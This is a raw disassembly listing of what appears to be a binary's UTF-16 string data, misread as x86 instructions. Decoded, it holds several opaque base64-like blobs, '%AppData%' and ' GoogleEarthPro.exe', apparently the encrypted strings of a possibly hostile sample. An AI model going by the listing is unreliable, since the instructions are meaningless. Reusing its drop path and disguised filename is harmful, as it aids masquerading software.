  409680:	00 7a 00             	add    %bh,0x0(%edx)
  409683:	4a                   	dec    %edx
  409684:	00 4e 00             	add    %cl,0x0(%esi)
  409687:	56                   	push   %esi
  409688:	00 57 00             	add    %dl,0x0(%edi)
  40968b:	35 00 63 00 46       	xor    $0x46006300,%eax
  409690:	00 7a 00             	add    %bh,0x0(%edx)
  409693:	31 00                	xor    %eax,(%eax)
  409695:	62 00                	bound  %eax,(%eax)
  409697:	6a 00                	push   $0x0
  409699:	66 00 47 00          	data16 add %al,0x0(%edi)
  40969d:	53                   	push   %ebx
  40969e:	00 62 00             	add    %ah,0x0(%edx)
  4096a1:	4c                   	dec    %esp
  4096a2:	00 41 00             	add    %al,0x0(%ecx)
  4096a5:	78 00                	js     0x4096a7
  4096a7:	52                   	push   %edx
  4096a8:	00 63 00             	add    %ah,0x0(%ebx)
  4096ab:	36 00 30             	add    %dh,%ss:(%eax)
  4096ae:	00 35 00 34 00 56    	add    %dh,0x56003400
  4096b4:	00 6b 00             	add    %ch,0x0(%ebx)
  4096b7:	54                   	push   %esp
  4096b8:	00 4b 00             	add    %cl,0x0(%ebx)
  4096bb:	57                   	push   %edi
  4096bc:	00 47 00             	add    %al,0x0(%edi)
  4096bf:	39 00                	cmp    %eax,(%eax)
  4096c1:	5a                   	pop    %edx
  4096c2:	00 61 00             	add    %ah,0x0(%ecx)
  4096c5:	6c                   	insb   (%dx),%es:(%edi)
  4096c6:	00 6b 00             	add    %ch,0x0(%ebx)
  4096c9:	30 00                	xor    %al,(%eax)
  4096cb:	48                   	dec    %eax
  4096cc:	00 45 00             	add    %al,0x0(%ebp)
  4096cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4096d0:	00 49 00             	add    %cl,0x0(%ecx)
  4096d3:	61                   	popa
  4096d4:	00 59 00             	add    %bl,0x0(%ecx)
  4096d7:	31 00                	xor    %eax,(%eax)
  4096d9:	48                   	dec    %eax
  4096da:	00 55 00             	add    %dl,0x0(%ebp)
  4096dd:	6a 00                	push   $0x0
  4096df:	36 00 37             	add    %dh,%ss:(%edi)
  4096e2:	00 78 00             	add    %bh,0x0(%eax)
  4096e5:	67 00 43 00          	add    %al,0x0(%bp,%di)
  4096e9:	54                   	push   %esp
  4096ea:	00 43 00             	add    %al,0x0(%ebx)
  4096ed:	53                   	push   %ebx
  4096ee:	00 2f                	add    %ch,(%edi)
  4096f0:	00 2f                	add    %ch,(%edi)
  4096f2:	00 71 00             	add    %dh,0x0(%ecx)
  4096f5:	77 00                	ja     0x4096f7
  4096f7:	54                   	push   %esp
  4096f8:	00 72 00             	add    %dh,0x0(%edx)
  4096fb:	70 00                	jo     0x4096fd
  4096fd:	00 81 b1 6f 00 4e    	add    %al,0x4e006fb1(%ecx)
  409703:	00 6b 00             	add    %ch,0x0(%ebx)
  409706:	34 00                	xor    $0x0,%al
  409708:	4a                   	dec    %edx
  409709:	00 74 00 76          	add    %dh,0x76(%eax,%eax,1)
  40970d:	00 55 00             	add    %dl,0x0(%ebp)
  409710:	64 00 68 00          	add    %ch,%fs:0x0(%eax)
  409714:	59                   	pop    %ecx
  409715:	00 57 00             	add    %dl,0x0(%edi)
  409718:	54                   	push   %esp
  409719:	00 68 00             	add    %ch,0x0(%eax)
  40971c:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  409720:	36 00 45 00          	add    %al,%ss:0x0(%ebp)
  409724:	7a 00                	jp     0x409726
  409726:	30 00                	xor    %al,(%eax)
  409728:	49                   	dec    %ecx
  409729:	00 35 00 72 00 4c    	add    %dh,0x4c007200
  40972f:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
  409733:	00 4d 00             	add    %cl,0x0(%ebp)
  409736:	45                   	inc    %ebp
  409737:	00 74 00 55          	add    %dh,0x55(%eax,%eax,1)
  40973b:	00 42 00             	add    %al,0x0(%edx)
  40973e:	50                   	push   %eax
  40973f:	00 35 00 38 00 67    	add    %dh,0x67003800
  409745:	00 6f 00             	add    %ch,0x0(%edi)
  409748:	75 00                	jne    0x40974a
  40974a:	35 00 57 00 39       	xor    $0x39005700,%eax
  40974f:	00 33                	add    %dh,(%ebx)
  409751:	00 2b                	add    %ch,(%ebx)
  409753:	00 4e 00             	add    %cl,0x0(%esi)
  409756:	67 00 6d 00          	add    %ch,0x0(%di)
  40975a:	77 00                	ja     0x40975c
  40975c:	51                   	push   %ecx
  40975d:	00 79 00             	add    %bh,0x0(%ecx)
  409760:	76 00                	jbe    0x409762
  409762:	54                   	push   %esp
  409763:	00 43 00             	add    %al,0x0(%ebx)
  409766:	76 00                	jbe    0x409768
  409768:	49                   	dec    %ecx
  409769:	00 4d 00             	add    %cl,0x0(%ebp)
  40976c:	4f                   	dec    %edi
  40976d:	00 55 00             	add    %dl,0x0(%ebp)
  409770:	69 00 55 00 2b 00    	imul   $0x2b0055,(%eax),%eax
  409776:	6c                   	insb   (%dx),%es:(%edi)
  409777:	00 6b 00             	add    %ch,0x0(%ebx)
  40977a:	4e                   	dec    %esi
  40977b:	00 57 00             	add    %dl,0x0(%edi)
  40977e:	43                   	inc    %ebx
  40977f:	00 58 00             	add    %bl,0x0(%eax)
  409782:	44                   	inc    %esp
  409783:	00 2b                	add    %ch,(%ebx)
  409785:	00 32                	add    %dh,(%edx)
  409787:	00 56 00             	add    %dl,0x0(%esi)
  40978a:	32 00                	xor    (%eax),%al
  40978c:	7a 00                	jp     0x40978e
  40978e:	30 00                	xor    %al,(%eax)
  409790:	4a                   	dec    %edx
  409791:	00 48 00             	add    %cl,0x0(%eax)
  409794:	4d                   	dec    %ebp
  409795:	00 38                	add    %bh,(%eax)
  409797:	00 4f 00             	add    %cl,0x0(%edi)
  40979a:	65 00 74 00 51       	add    %dh,%gs:0x51(%eax,%eax,1)
  40979f:	00 32                	add    %dh,(%edx)
  4097a1:	00 45 00             	add    %al,0x0(%ebp)
  4097a4:	42                   	inc    %edx
  4097a5:	00 65 00             	add    %ah,0x0(%ebp)
  4097a8:	6a 00                	push   $0x0
  4097aa:	52                   	push   %edx
  4097ab:	00 6a 00             	add    %ch,0x0(%edx)
  4097ae:	4e                   	dec    %esi
  4097af:	00 73 00             	add    %dh,0x0(%ebx)
  4097b2:	42                   	inc    %edx
  4097b3:	00 6b 00             	add    %ch,0x0(%ebx)
  4097b6:	34 00                	xor    $0x0,%al
  4097b8:	57                   	push   %edi
  4097b9:	00 4e 00             	add    %cl,0x0(%esi)
  4097bc:	62 00                	bound  %eax,(%eax)
  4097be:	6a 00                	push   $0x0
  4097c0:	35 00 64 00 48       	xor    $0x48006400,%eax
  4097c5:	00 6d 00             	add    %ch,0x0(%ebp)
  4097c8:	58                   	pop    %eax
  4097c9:	00 42 00             	add    %al,0x0(%edx)
  4097cc:	57                   	push   %edi
  4097cd:	00 77 00             	add    %dh,0x0(%edi)
  4097d0:	54                   	push   %esp
  4097d1:	00 47 00             	add    %al,0x0(%edi)
  4097d4:	78 00                	js     0x4097d6
  4097d6:	68 00 4a 00 7a       	push   $0x7a004a00
  4097db:	00 37                	add    %dh,(%edi)
  4097dd:	00 37                	add    %dh,(%edi)
  4097df:	00 49 00             	add    %cl,0x0(%ecx)
  4097e2:	6b 00 51             	imul   $0x51,(%eax),%eax
  4097e5:	00 7a 00             	add    %bh,0x0(%edx)
  4097e8:	57                   	push   %edi
  4097e9:	00 6c 00 71          	add    %ch,0x71(%eax,%eax,1)
  4097ed:	00 2f                	add    %ch,(%edi)
  4097ef:	00 72 00             	add    %dh,0x0(%edx)
  4097f2:	49                   	dec    %ecx
  4097f3:	00 66 00             	add    %ah,0x0(%esi)
  4097f6:	45                   	inc    %ebp
  4097f7:	00 53 00             	add    %dl,0x0(%ebx)
  4097fa:	59                   	pop    %ecx
  4097fb:	00 2b                	add    %ch,(%ebx)
  4097fd:	00 77 00             	add    %dh,0x0(%edi)
  409800:	4c                   	dec    %esp
  409801:	00 73 00             	add    %dh,0x0(%ebx)
  409804:	48                   	dec    %eax
  409805:	00 63 00             	add    %ah,0x0(%ebx)
  409808:	7a 00                	jp     0x40980a
  40980a:	46                   	inc    %esi
  40980b:	00 44 00 48          	add    %al,0x48(%eax,%eax,1)
  40980f:	00 61 00             	add    %ah,0x0(%ecx)
  409812:	47                   	inc    %edi
  409813:	00 6e 00             	add    %ch,0x0(%esi)
  409816:	4c                   	dec    %esp
  409817:	00 32                	add    %dh,(%edx)
  409819:	00 54 00 2b          	add    %dl,0x2b(%eax,%eax,1)
  40981d:	00 74 00 6a          	add    %dh,0x6a(%eax,%eax,1)
  409821:	00 6f 00             	add    %ch,0x0(%edi)
  409824:	36 00 73 00          	add    %dh,%ss:0x0(%ebx)
  409828:	6b 00 56             	imul   $0x56,(%eax),%eax
  40982b:	00 70 00             	add    %dh,0x0(%eax)
  40982e:	61                   	popa
  40982f:	00 55 00             	add    %dl,0x0(%ebp)
  409832:	58                   	pop    %eax
  409833:	00 5a 00             	add    %bl,0x0(%edx)
  409836:	49                   	dec    %ecx
  409837:	00 77 00             	add    %dh,0x0(%edi)
  40983a:	41                   	inc    %ecx
  40983b:	00 50 00             	add    %dl,0x0(%eax)
  40983e:	46                   	inc    %esi
  40983f:	00 53 00             	add    %dl,0x0(%ebx)
  409842:	76 00                	jbe    0x409844
  409844:	69 00 2f 00 6a 00    	imul   $0x6a002f,(%eax),%eax
  40984a:	55                   	push   %ebp
  40984b:	00 4e 00             	add    %cl,0x0(%esi)
  40984e:	39 00                	cmp    %eax,(%eax)
  409850:	42                   	inc    %edx
  409851:	00 79 00             	add    %bh,0x0(%ecx)
  409854:	54                   	push   %esp
  409855:	00 5a 00             	add    %bl,0x0(%edx)
  409858:	4d                   	dec    %ebp
  409859:	00 6a 00             	add    %ch,0x0(%edx)
  40985c:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  409860:	31 00                	xor    %eax,(%eax)
  409862:	35 00 6a 00 66       	xor    $0x66006a00,%eax
  409867:	00 34 00             	add    %dh,(%eax,%eax,1)
  40986a:	77 00                	ja     0x40986c
  40986c:	63 00                	arpl   %eax,(%eax)
  40986e:	6d                   	insl   (%dx),%es:(%edi)
  40986f:	00 71 00             	add    %dh,0x0(%ecx)
  409872:	49                   	dec    %ecx
  409873:	00 45 00             	add    %al,0x0(%ebp)
  409876:	35 00 71 00 72       	xor    $0x72007100,%eax
  40987b:	00 4f 00             	add    %cl,0x0(%edi)
  40987e:	49                   	dec    %ecx
  40987f:	00 55 00             	add    %dl,0x0(%ebp)
  409882:	37                   	aaa
  409883:	00 58 00             	add    %bl,0x0(%eax)
  409886:	39 00                	cmp    %eax,(%eax)
  409888:	51                   	push   %ecx
  409889:	00 65 00             	add    %ah,0x0(%ebp)
  40988c:	44                   	inc    %esp
  40988d:	00 76 00             	add    %dh,0x0(%esi)
  409890:	56                   	push   %esi
  409891:	00 68 00             	add    %ch,0x0(%eax)
  409894:	38 00                	cmp    %al,(%eax)
  409896:	55                   	push   %ebp
  409897:	00 70 00             	add    %dh,0x0(%eax)
  40989a:	54                   	push   %esp
  40989b:	00 54 00 66          	add    %dl,0x66(%eax,%eax,1)
  40989f:	00 55 00             	add    %dl,0x0(%ebp)
  4098a2:	77 00                	ja     0x4098a4
  4098a4:	78 00                	js     0x4098a6
  4098a6:	6d                   	insl   (%dx),%es:(%edi)
  4098a7:	00 32                	add    %dh,(%edx)
  4098a9:	00 67 00             	add    %ah,0x0(%edi)
  4098ac:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  4098b1:	80 b1 7a 00 42 00 79 	xorb   $0x79,0x42007a(%ecx)
  4098b8:	00 39                	add    %bh,(%ecx)
  4098ba:	00 44 00 49          	add    %al,0x49(%eax,%eax,1)
  4098be:	00 79 00             	add    %bh,0x0(%ecx)
  4098c1:	70 00                	jo     0x4098c3
  4098c3:	4f                   	dec    %edi
  4098c4:	00 34 00             	add    %dh,(%eax,%eax,1)
  4098c7:	38 00                	cmp    %al,(%eax)
  4098c9:	50                   	push   %eax
  4098ca:	00 7a 00             	add    %bh,0x0(%edx)
  4098cd:	4c                   	dec    %esp
  4098ce:	00 37                	add    %dh,(%edi)
  4098d0:	00 63 00             	add    %ah,0x0(%ebx)
  4098d3:	78 00                	js     0x4098d5
  4098d5:	53                   	push   %ebx
  4098d6:	00 52 00             	add    %dl,0x0(%edx)
  4098d9:	30 00                	xor    %al,(%eax)
  4098db:	79 00                	jns    0x4098dd
  4098dd:	75 00                	jne    0x4098df
  4098df:	59                   	pop    %ecx
  4098e0:	00 7a 00             	add    %bh,0x0(%edx)
  4098e3:	59                   	pop    %ecx
  4098e4:	00 38                	add    %bh,(%eax)
  4098e6:	00 74 00 71          	add    %dh,0x71(%eax,%eax,1)
  4098ea:	00 64 00 48          	add    %ah,0x48(%eax,%eax,1)
  4098ee:	00 43 00             	add    %al,0x0(%ebx)
  4098f1:	75 00                	jne    0x4098f3
  4098f3:	63 00                	arpl   %eax,(%eax)
  4098f5:	49                   	dec    %ecx
  4098f6:	00 34 00             	add    %dh,(%eax,%eax,1)
  4098f9:	76 00                	jbe    0x4098fb
  4098fb:	62 00                	bound  %eax,(%eax)
  4098fd:	39 00                	cmp    %eax,(%eax)
  4098ff:	71 00                	jno    0x409901
  409901:	4e                   	dec    %esi
  409902:	00 61 00             	add    %ah,0x0(%ecx)
  409905:	31 00                	xor    %eax,(%eax)
  409907:	54                   	push   %esp
  409908:	00 32                	add    %dh,(%edx)
  40990a:	00 4a 00             	add    %cl,0x0(%edx)
  40990d:	39 00                	cmp    %eax,(%eax)
  40990f:	32 00                	xor    (%eax),%al
  409911:	35 00 56 00 56       	xor    $0x56005600,%eax
  409916:	00 45 00             	add    %al,0x0(%ebp)
  409919:	38 00                	cmp    %al,(%eax)
  40991b:	2f                   	das
  40991c:	00 49 00             	add    %cl,0x0(%ecx)
  40991f:	75 00                	jne    0x409921
  409921:	51                   	push   %ecx
  409922:	00 39                	add    %bh,(%ecx)
  409924:	00 59 00             	add    %bl,0x0(%ecx)
  409927:	39 00                	cmp    %eax,(%eax)
  409929:	47                   	inc    %edi
  40992a:	00 42 00             	add    %al,0x0(%edx)
  40992d:	73 00                	jae    0x40992f
  40992f:	71 00                	jno    0x409931
  409931:	54                   	push   %esp
  409932:	00 52 00             	add    %dl,0x0(%edx)
  409935:	54                   	push   %esp
  409936:	00 48 00             	add    %cl,0x0(%eax)
  409939:	30 00                	xor    %al,(%eax)
  40993b:	54                   	push   %esp
  40993c:	00 42 00             	add    %al,0x0(%edx)
  40993f:	72 00                	jb     0x409941
  409941:	4f                   	dec    %edi
  409942:	00 4a 00             	add    %cl,0x0(%edx)
  409945:	36 00 79 00          	add    %bh,%ss:0x0(%ecx)
  409949:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
  40994d:	57                   	push   %edi
  40994e:	00 79 00             	add    %bh,0x0(%ecx)
  409951:	74 00                	je     0x409953
  409953:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
  409957:	61                   	popa
  409958:	00 45 00             	add    %al,0x0(%ebp)
  40995b:	39 00                	cmp    %eax,(%eax)
  40995d:	41                   	inc    %ecx
  40995e:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  409964:	80 b1 2f 00 63 00 39 	xorb   $0x39,0x63002f(%ecx)
  40996b:	00 4b 00             	add    %cl,0x0(%ebx)
  40996e:	44                   	inc    %esp
  40996f:	00 56 00             	add    %dl,0x0(%esi)
  409972:	37                   	aaa
  409973:	00 51 00             	add    %dl,0x0(%ecx)
  409976:	43                   	inc    %ebx
  409977:	00 2b                	add    %ch,(%ebx)
  409979:	00 49 00             	add    %cl,0x0(%ecx)
  40997c:	37                   	aaa
  40997d:	00 2f                	add    %ch,(%edi)
  40997f:	00 6c 00 5a          	add    %ch,0x5a(%eax,%eax,1)
  409983:	00 6a 00             	add    %ch,0x0(%edx)
  409986:	2f                   	das
  409987:	00 55 00             	add    %dl,0x0(%ebp)
  40998a:	66 00 39             	data16 add %bh,(%ecx)
  40998d:	00 7a 00             	add    %bh,0x0(%edx)
  409990:	70 00                	jo     0x409992
  409992:	45                   	inc    %ebp
  409993:	00 39                	add    %bh,(%ecx)
  409995:	00 73 00             	add    %dh,0x0(%ebx)
  409998:	57                   	push   %edi
  409999:	00 73 00             	add    %dh,0x0(%ebx)
  40999c:	79 00                	jns    0x40999e
  40999e:	53                   	push   %ebx
  40999f:	00 70 00             	add    %dh,0x0(%eax)
  4099a2:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
  4099a6:	72 00                	jb     0x4099a8
  4099a8:	6a 00                	push   $0x0
  4099aa:	4f                   	dec    %edi
  4099ab:	00 59 00             	add    %bl,0x0(%ecx)
  4099ae:	4e                   	dec    %esi
  4099af:	00 36                	add    %dh,(%esi)
  4099b1:	00 65 00             	add    %ah,0x0(%ebp)
  4099b4:	4e                   	dec    %esi
  4099b5:	00 5a 00             	add    %bl,0x0(%edx)
  4099b8:	49                   	dec    %ecx
  4099b9:	00 42 00             	add    %al,0x0(%edx)
  4099bc:	70 00                	jo     0x4099be
  4099be:	7a 00                	jp     0x4099c0
  4099c0:	70 00                	jo     0x4099c2
  4099c2:	41                   	inc    %ecx
  4099c3:	00 4c 00 6c          	add    %cl,0x6c(%eax,%eax,1)
  4099c7:	00 59 00             	add    %bl,0x0(%ecx)
  4099ca:	6c                   	insb   (%dx),%es:(%edi)
  4099cb:	00 70 00             	add    %dh,0x0(%eax)
  4099ce:	7a 00                	jp     0x4099d0
  4099d0:	77 00                	ja     0x4099d2
  4099d2:	78 00                	js     0x4099d4
  4099d4:	6e                   	outsb  %ds:(%esi),(%dx)
  4099d5:	00 72 00             	add    %dh,0x0(%edx)
  4099d8:	77 00                	ja     0x4099da
  4099da:	6a 00                	push   $0x0
  4099dc:	69 00 6d 00 6a 00    	imul   $0x6a006d,(%eax),%eax
  4099e2:	51                   	push   %ecx
  4099e3:	00 68 00             	add    %ch,0x0(%eax)
  4099e6:	63 00                	arpl   %eax,(%eax)
  4099e8:	45                   	inc    %ebp
  4099e9:	00 61 00             	add    %ah,0x0(%ecx)
  4099ec:	53                   	push   %ebx
  4099ed:	00 51 00             	add    %dl,0x0(%ecx)
  4099f0:	43                   	inc    %ebx
  4099f1:	00 72 00             	add    %dh,0x0(%edx)
  4099f4:	58                   	pop    %eax
  4099f5:	00 70 00             	add    %dh,0x0(%eax)
  4099f8:	6b 00 79             	imul   $0x79,(%eax),%eax
  4099fb:	00 46 00             	add    %al,0x0(%esi)
  4099fe:	76 00                	jbe    0x409a00
  409a00:	77 00                	ja     0x409a02
  409a02:	62 00                	bound  %eax,(%eax)
  409a04:	50                   	push   %eax
  409a05:	00 43 00             	add    %al,0x0(%ebx)
  409a08:	45                   	inc    %ebp
  409a09:	00 4c 00 73          	add    %cl,0x73(%eax,%eax,1)
  409a0d:	00 53 00             	add    %dl,0x0(%ebx)
  409a10:	41                   	inc    %ecx
  409a11:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  409a17:	13 25 00 41 00 70    	adc    0x70004100,%esp
  409a1d:	00 70 00             	add    %dh,0x0(%eax)
  409a20:	44                   	inc    %esp
  409a21:	00 61 00             	add    %ah,0x0(%ecx)
  409a24:	74 00                	je     0x409a26
  409a26:	61                   	popa
  409a27:	00 25 00 00 27 20    	add    %ah,0x20270000
  409a2d:	00 47 00             	add    %al,0x0(%edi)
  409a30:	6f                   	outsl  %ds:(%esi),(%dx)
  409a31:	00 6f 00             	add    %ch,0x0(%edi)
  409a34:	67 00 6c 00          	add    %ch,0x0(%si)
  409a38:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
  409a3c:	61                   	popa
  409a3d:	00 72 00             	add    %dh,0x0(%edx)
  409a40:	74 00                	je     0x409a42
  409a42:	68 00 50 00 72       	push   $0x72005000
  409a47:	00 6f 00             	add    %ch,0x0(%edi)
  409a4a:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  409a4e:	78 00                	js     0x409a50
  409a50:	65 00 00             	add    %al,%gs:(%eax)
  409a53:	59                   	pop    %ecx
  409a54:	4f                   	dec    %edi
  409a55:	00 48 00             	add    %cl,0x0(%eax)
  409a58:	52                   	push   %edx
  409a59:	00 4a 00             	add    %cl,0x0(%edx)
  409a5c:	4e                   	dec    %esi
  409a5d:	00 31                	add    %dh,(%ecx)
  409a5f:	00 5a 00             	add    %bl,0x0(%edx)
  409a62:	70 00                	jo     0x409a64
  409a64:	53                   	push   %ebx
  409a65:	00 54 00 64          	add    %dl,0x64(%eax,%eax,1)
  409a69:	00 4c 00 4e          	add    %cl,0x4e(%eax,%eax,1)
  409a6d:	00 44 00 42          	add    %al,0x42(%eax,%eax,1)
  409a71:	00 47 00             	add    %al,0x0(%edi)
  409a74:	62 00                	bound  %eax,(%eax)
  409a76:	31 00                	xor    %eax,(%eax)
  409a78:	4a                   	dec    %edx
  409a79:	00 47 00             	add    %al,0x0(%edi)
  409a7c:	54                   	push   %esp
  409a7d:	00 6b 00             	add    %ch,0x0(%ebx)
  409a80:	39 00                	cmp    %eax,(%eax)
  409a82:	4b                   	dec    %ebx
  409a83:	00 56 00             	add    %dl,0x0(%esi)
  409a86:	6c                   	insb   (%dx),%es:(%edi)
  409a87:	00 42 00             	add    %al,0x0(%edx)
  409a8a:	57                   	push   %edi
  409a8b:	00 54 00 6c          	add    %dl,0x6c(%eax,%eax,1)
  409a8f:	00 51 00             	add    %dl,0x0(%ecx)
  409a92:	31 00                	xor    %eax,(%eax)
  409a94:	53                   	push   %ebx
  409a95:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
  409a99:	00 61 00             	add    %ah,0x0(%ecx)
  409a9c:	53                   	push   %ebx
  409a9d:	00 55 00             	add    %dl,0x0(%ebp)
  409aa0:	6c                   	insb   (%dx),%es:(%edi)
  409aa1:	00 48 00             	add    %cl,0x0(%eax)
  409aa4:	56                   	push   %esi
  409aa5:	00 58 00             	add    %bl,0x0(%eax)
  409aa8:	51                   	push   %ecx
  409aa9:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  409aaf:	74 00                	je     0x409ab1
  409ab1:	67 00 6c 00          	add    %ch,0x0(%si)
  409ab5:	50                   	push   %eax
  409ab6:	00 64 00 53          	add    %ah,0x53(%eax,%eax,1)
  409aba:	00 50 00             	add    %dl,0x0(%eax)
  409abd:	76 00                	jbe    0x409abf
  409abf:	49                   	dec    %ecx
  409ac0:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
  409ac4:	00 44 00 72          	add    %al,0x72(%eax,%eax,1)
  409ac8:	00 38                	add    %bh,(%eax)
  409aca:	00 50 00             	add    %dl,0x0(%eax)
  409acd:	68 00 75 00 34       	push   $0x34007500
  409ad2:	00 31                	add    %dh,(%ecx)
  409ad4:	00 79 00             	add    %bh,0x0(%ecx)
  409ad7:	74 00                	je     0x409ad9
  409ad9:	67 00 4e 00          	add    %cl,0x0(%bp)
  409add:	56                   	push   %esi
  409ade:	00 52 00             	add    %dl,0x0(%edx)
  409ae1:	74 00                	je     0x409ae3
  409ae3:	72 00                	jb     0x409ae5
  409ae5:	69 00 39 00 52 00    	imul   $0x520039,(%eax),%eax
  409aeb:	77 00                	ja     0x409aed
  409aed:	57                   	push   %edi
  409aee:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  409af2:	00 38                	add    %bh,(%eax)
  409af4:	00 4c 00 67          	add    %cl,0x67(%eax,%eax,1)
  409af8:	00 78 00             	add    %bh,0x0(%eax)
  409afb:	75 00                	jne    0x409afd
  409afd:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
  409b01:	4c                   	dec    %esp
  409b02:	00 78 00             	add    %bh,0x0(%eax)
  409b05:	6f                   	outsl  %ds:(%esi),(%dx)
  409b06:	00 55 00             	add    %dl,0x0(%ebp)
  409b09:	55                   	push   %ebp
  409b0a:	00 72 00             	add    %dh,0x0(%edx)
  409b0d:	49                   	dec    %ecx
  409b0e:	00 65 00             	add    %ah,0x0(%ebp)
  409b11:	71 00                	jno    0x409b13
  409b13:	6a 00                	push   $0x0
  409b15:	44                   	inc    %esp
  409b16:	00 74 00 66          	add    %dh,0x66(%eax,%eax,1)
  409b1a:	00 46 00             	add    %al,0x0(%esi)
  409b1d:	52                   	push   %edx
  409b1e:	00 56 00             	add    %dl,0x0(%esi)
  409b21:	66 00 56 00          	data16 add %dl,0x0(%esi)
  409b25:	71 00                	jno    0x409b27
  409b27:	6d                   	insl   (%dx),%es:(%edi)
  409b28:	00 45 00             	add    %al,0x0(%ebp)
  409b2b:	66 00 38             	data16 add %bh,(%eax)
  409b2e:	00 79 00             	add    %bh,0x0(%ecx)
  409b31:	6a 00                	push   $0x0
  409b33:	6e                   	outsb  %ds:(%esi),(%dx)
  409b34:	00 32                	add    %dh,(%edx)
  409b36:	00 61 00             	add    %ah,0x0(%ecx)
  409b39:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  409b3d:	4d                   	dec    %ebp
  409b3e:	00 68 00             	add    %ch,0x0(%eax)
  409b41:	6f                   	outsl  %ds:(%esi),(%dx)
  409b42:	00 36                	add    %dh,(%esi)
  409b44:	00 73 00             	add    %dh,0x0(%ebx)
  409b47:	43                   	inc    %ebx
  409b48:	00 2f                	add    %ch,(%edi)
  409b4a:	00 30                	add    %dh,(%eax)
  409b4c:	00 4e 00             	add    %cl,0x0(%esi)
  409b4f:	63 00                	arpl   %eax,(%eax)
  409b51:	6a 00                	push   $0x0
  409b53:	2f                   	das
  409b54:	00 4b 00             	add    %cl,0x0(%ebx)
  409b57:	48                   	dec    %eax
  409b58:	00 67 00             	add    %ah,0x0(%edi)
  409b5b:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409b60:	92                   	xchg   %eax,%edx
  409b61:	01 5a 00             	add    %ebx,0x0(%edx)
  409b64:	2f                   	das
  409b65:	00 77 00             	add    %dh,0x0(%edi)
  409b68:	70 00                	jo     0x409b6a
  409b6a:	48                   	dec    %eax
  409b6b:	00 41 00             	add    %al,0x0(%ecx)
  409b6e:	54                   	push   %esp
  409b6f:	00 4d 00             	add    %cl,0x0(%ebp)
  409b72:	42                   	inc    %edx
  409b73:	00 4c 00 4c          	add    %cl,0x4c(%eax,%eax,1)
  409b77:	00 46 00             	add    %al,0x0(%esi)
  409b7a:	66 00 4e 00          	data16 add %cl,0x0(%esi)
  409b7e:	79 00                	jns    0x409b80
  409b80:	50                   	push   %eax
  409b81:	00 34 00             	add    %dh,(%eax,%eax,1)
  409b84:	4c                   	dec    %esp
  409b85:	00 4d 00             	add    %cl,0x0(%ebp)
  409b88:	78 00                	js     0x409b8a
  409b8a:	34 00                	xor    $0x0,%al
  409b8c:	36 00 4d 00          	add    %cl,%ss:0x0(%ebp)
  409b90:	2b 00                	sub    (%eax),%eax
  409b92:	44                   	inc    %esp
  409b93:	00 50 00             	add    %dl,0x0(%eax)
  409b96:	70 00                	jo     0x409b98
  409b98:	2f                   	das
  409b99:	00 52 00             	add    %dl,0x0(%edx)
  409b9c:	55                   	push   %ebp
  409b9d:	00 50 00             	add    %dl,0x0(%eax)
  409ba0:	58                   	pop    %eax
  409ba1:	00 4b 00             	add    %cl,0x0(%ebx)
  409ba4:	41                   	inc    %ecx
  409ba5:	00 77 00             	add    %dh,0x0(%edi)
  409ba8:	6e                   	outsb  %ds:(%esi),(%dx)
  409ba9:	00 43 00             	add    %al,0x0(%ebx)
  409bac:	35 00 6f 00 79       	xor    $0x79006f00,%eax
  409bb1:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  409bb5:	00 47 00             	add    %al,0x0(%edi)
  409bb8:	52                   	push   %edx
  409bb9:	00 75 00             	add    %dh,0x0(%ebp)
  409bbc:	70 00                	jo     0x409bbe
  409bbe:	4b                   	dec    %ebx
  409bbf:	00 54 00 73          	add    %dl,0x73(%eax,%eax,1)
  409bc3:	00 62 00             	add    %ah,0x0(%edx)
  409bc6:	38 00                	cmp    %al,(%eax)
  409bc8:	48                   	dec    %eax
  409bc9:	00 63 00             	add    %ah,0x0(%ebx)
  409bcc:	31 00                	xor    %eax,(%eax)
  409bce:	48                   	dec    %eax
  409bcf:	00 43 00             	add    %al,0x0(%ebx)
  409bd2:	78 00                	js     0x409bd4
  409bd4:	76 00                	jbe    0x409bd6
  409bd6:	63 00                	arpl   %eax,(%eax)
  409bd8:	68 00 6b 00 33       	push   $0x33006b00
  409bdd:	00 30                	add    %dh,(%eax)
  409bdf:	00 69 00             	add    %ch,0x0(%ecx)
  409be2:	59                   	pop    %ecx
  409be3:	00 38                	add    %bh,(%eax)
  409be5:	00 4b 00             	add    %cl,0x0(%ebx)
  409be8:	6c                   	insb   (%dx),%es:(%edi)
  409be9:	00 55 00             	add    %dl,0x0(%ebp)
  409bec:	54                   	push   %esp
  409bed:	00 59 00             	add    %bl,0x0(%ecx)
  409bf0:	6c                   	insb   (%dx),%es:(%edi)
  409bf1:	00 64 00 2f          	add    %ah,0x2f(%eax,%eax,1)
  409bf5:	00 33                	add    %dh,(%ebx)
  409bf7:	00 55 00             	add    %dl,0x0(%ebp)
  409bfa:	39 00                	cmp    %eax,(%eax)
  409bfc:	75 00                	jne    0x409bfe
  409bfe:	48                   	dec    %eax
  409bff:	00 6e 00             	add    %ch,0x0(%esi)
  409c02:	31 00                	xor    %eax,(%eax)
  409c04:	71 00                	jno    0x409c06
  409c06:	67 00 4f 00          	add    %cl,0x0(%bx)
  409c0a:	37                   	aaa
  409c0b:	00 78 00             	add    %bh,0x0(%eax)
  409c0e:	55                   	push   %ebp
  409c0f:	00 4d 00             	add    %cl,0x0(%ebp)
  409c12:	35 00 35 00 31       	xor    $0x31003500,%eax
  409c17:	00 47 00             	add    %al,0x0(%edi)
  409c1a:	53                   	push   %ebx
  409c1b:	00 39                	add    %bh,(%ecx)
